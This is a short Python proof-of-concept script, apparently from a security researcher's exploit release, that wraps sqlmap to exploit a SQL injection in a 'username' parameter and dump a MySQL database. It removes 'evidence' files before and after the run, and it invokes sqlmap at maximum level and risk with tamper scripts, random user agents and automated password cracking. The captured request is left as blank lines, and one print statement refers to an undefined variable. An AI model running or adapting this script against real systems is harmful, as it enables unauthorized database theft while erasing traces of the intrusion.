#!/usr/bin/python3
# nu11secur1ty
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

# Clean
print("Cleaning of the old evidence...\n")
time.sleep(3)

# Windows
evidenceW=os.system("del \\path\\to\\your\\environment\\exploit.txt")

# Linux
evidenceL=os.system("rm -rf /path/to/your/environment/exploit.txt")

print("The cleaning STATUS of evidence is", evidence)
print("The PoC process will be continue......\n")
time.sleep(5)

## Generating of payload
## /path/to/your/environment/exploit.txt
exploit = open("/path/to/your/environment/exploit.txt", "a")

## your content length and lines numbers of your POST Request exploit.
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write("\n")
exploit.write('\n\n')
exploit.write("\n")


exploit.close()

## Debug
#print(exploit.read())

# Environment
os.system('cd your_environment/nu11secur1ty-sqlmap')

print(Style.RESET_ALL)

## Customize your exploit line
## WARNING! If you don't know what is this, don't edit it!
## Call some specialist =)
## BR
os.system('python sqlmap.py -r /path/to/your/environment/exploit.txt -p username --time-sec=17 --tamper=space2comment --random-agent --level=5 --risk=3 --dbms=mysql --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" -D yourdatabase --dump')

time.sleep(3)
# Windows
os.system("del \\path\\to\\your\\environment\\exploit.txt")
# Linux
os.system("rm -rf /path/to/your/environment/exploit.txt")

print(Fore.RED +"Happy hunting with nu11secur1ty =)")
print(Style.RESET_ALL)
